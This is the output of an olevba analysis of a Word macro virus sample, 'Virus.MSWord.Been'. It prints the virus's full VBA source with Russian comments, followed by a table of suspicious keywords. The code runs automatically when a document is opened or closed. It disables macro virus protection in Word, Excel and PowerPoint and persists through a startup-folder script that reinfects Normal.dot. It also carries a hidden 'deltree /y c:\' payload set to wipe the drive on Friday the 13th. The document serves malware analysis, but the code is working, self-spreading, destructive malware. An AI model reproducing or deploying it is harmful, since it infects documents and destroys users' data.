olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Been
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Been - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO MSNI.bas 
in file: Virus.MSWord.Been - OLE stream: 'Macros/VBA/MSNI'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' MSDI.sys (Блок инфецирования документов)
' MSNR.sys (Блок востановления кода в Normal.dot)
' MSNI.sys (Блок инфецирования Normal.dot)

Sub AutoOpen()
On Error Resume Next
Options.VirusProtection = False
ShowVisualBasicEditor = False
 For i = 1 To NormalTemplate.VBProject.VBComponents.Count
   If NormalTemplate.VBProject.VBComponents(i).Name = "MSDI" Then Vp = True
 Next i
 If Vp <> True Then
   ActiveDocument.VBProject.VBComponents("MSNI").Export ("C:\Windows\MSNI.sys")
   ActiveDocument.VBProject.VBComponents("MSDI").Export ("C:\Windows\MSDI.sys")
   ActiveDocument.VBProject.VBComponents("MSNR").Export ("C:\Windows\MSNR.sys")
   Kill "C:\WINDOWS\Главное меню\Программы\Автозагрузка\MSNR.vbs"
   Open "C:\WINDOWS\Главное меню\Программы\Автозагрузка\MSNR.vbs" For Append As #1
   CurLine = ActiveDocument.VBProject.VBComponents("MSNR").CodeModule.Lines(1, ActiveDocument.VBProject.VBComponents("MSNR").CodeModule.CountOfLines)
   Print #1, CurLine
   Print #1, "Call RestoNormalMacros"
   Close #1
   NormalTemplate.VBProject.VBComponents.Import ("C:\Windows\MSDI.sys")
 End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO MSDI.bas 
in file: Virus.MSWord.Been - OLE stream: 'Macros/VBA/MSDI'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' MSDI.sys (Блок инфецирования документов)
' MSNR.sys (Блок востановления кода в Normal.dot)
' MSNI.sys (Блок инфецирования Normal.dot)

Sub AutoClose()
On Error Resume Next
Options.VirusProtection = False
ShowVisualBasicEditor = False
 For i = 1 To ActiveDocument.VBProject.VBComponents.Count
   If ActiveDocument.VBProject.VBComponents(i).Name = "MSNI" Then Vp = True
 Next i
 If Vp = False Then
   ActiveDocument.VBProject.VBComponents.Import ("C:\Windows\MSNI.sys")
   ActiveDocument.VBProject.VBComponents.Import ("C:\Windows\MSDI.sys")
   ActiveDocument.VBProject.VBComponents.Import ("C:\Windows\MSNR.sys")
 End If
 Call Destructor
End Sub

Sub Destructor()
On Error Resume Next
If WeekDay(Date) = 6 And Day(Date) = 13 Then
Shell "deltree /y c:\ >nul", vbHide
End If
End Sub

Private Sub HelpAbout()
    MsgBox "Lamers Must Been DEAD !!! BioCoded By DEATHtroyer", , "Macro-Script Virus ver1.0"
End Sub


Private Sub ViewVBCode()
End Sub

Private Sub FileTemplates()
End Sub

Private Sub ToolsMacro()
End Sub

Private Sub Organizer()
End Sub
-------------------------------------------------------------------------------
VBA MACRO MSNR.bas 
in file: Virus.MSWord.Been - OLE stream: 'Macros/VBA/MSNR'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Данный Script при каждом запуске компа  востанавливает
' код в Normal.dot если он там отсутствует, а также выключает антивирусную защиту
' всех приложений Oficce 97

Sub RestoNormalMacros()
    Set WordObj = CreateObject("Word.Application")
    Set NT = WordObj.NormalTemplate.VBProject.VBComponents
    NotRestore = False
    WordObj.Options.VirusProtection = False
    WordObj.System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = "Check"
    WordObj.System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Office\8.0\New User Settings\Excel\Microsoft Excel", "Options6") = ""
    WordObj.System.PrivateProfileString("", "HKEY_USERS\.Default\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = "Whoa"
    WordObj.System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\PowerPoint\Options", "MacroVirusProtection") = ""
    WordObj.System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Office\8.0\New User Settings\PowerPoint\Options", "MacroVirusProtection") = ""
    WordObj.System.PrivateProfileString("", "HKEY_USERS\.Default\Software\Microsoft\Office\8.0\PowerPoint\Options", "MacroVirusProtection") = ""
    For i = 1 To NT.Count
        If NT(i).Name = "MSDI" Then NotRestore = True
    Next
    If NotRestore <> True Then
        NT.Import ("C:\Windows\MSDI.sys")
        WordObj.NormalTemplate.Save
    End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |MSNR.vbs            |Executable file name                         |
|Base64    |1#H                 |MSNI                                         |
|String    |                    |                                             |
|Base64    |1#Q                 |MSNR                                         |
|String    |                    |                                             |
+----------+--------------------+---------------------------------------------+

